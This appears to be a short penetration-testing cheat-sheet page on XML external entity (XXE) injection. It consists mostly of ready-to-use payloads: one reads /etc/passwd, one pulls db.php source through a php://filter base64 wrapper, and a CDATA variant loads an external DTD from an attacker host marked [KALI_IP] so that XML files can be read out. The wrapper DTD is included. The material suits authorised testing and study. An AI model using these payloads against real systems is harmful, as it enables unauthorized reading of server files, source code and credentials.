# XXE

`file://` can also be used to list directories.

```xml
Content-Type: application/json

<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE title [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
	<bugreport>
		<title>&xxe;</title>
		<cwe></cwe>
		<cvss></cvss>
		<reward></reward>
	</bugreport>
```

{% code overflow="wrap" %}
```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE title [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
	<bugreport>
		<title>&xxe;</title>
		<cwe>wef</cwe>
		<cvss>wef</cvss>
		<reward>wef</reward>
	</bugreport>
```
{% endcode %}

## Reading XML Files with CDATA

Bypass `<` and `>` parsing issue. Content inside CDATA wrapper are not rendered.

{% code overflow="wrap" %}
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///file/to/read.xml" >
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://[KALI_IP]/wrapper.dtd" >
%dtd;
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&wrapper;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
```
{% endcode %}

**wrapper.dtd** hosted on kali:

```xml
<!ENTITY wrapper "%start;%file;%end;">
```
